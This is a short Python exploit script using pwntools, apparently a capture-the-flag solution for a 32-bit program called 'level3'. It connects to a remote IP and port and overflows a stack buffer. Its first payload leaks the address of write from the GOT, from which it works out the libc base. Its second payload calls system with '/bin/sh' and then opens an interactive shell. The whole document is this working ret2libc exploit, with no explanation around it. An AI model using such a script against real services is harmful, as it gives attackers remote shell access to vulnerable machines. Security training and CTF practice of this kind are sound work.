from pwn import *

#sh = process("./level3")
sh = remote("61.147.171.105",56935)

elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']

sh.recvuntil(":\n")
payload1 = flat([b'a' * (0x88+4), write_plt, main_addr, 1, write_got, 0x4])
sh.sendline(payload1)
write_real = u32(sh.recv(4))

libc_base = write_real - libc.sym['write']

system_real = libc_base + libc.sym['system']
binsh_real = libc_base + 0x15902b

payload2 = flat([b'a' * (0x88+4), system_real, b'a' * 4, binsh_real])
sh.sendlineafter(":\n", payload2)
sh.interactive()

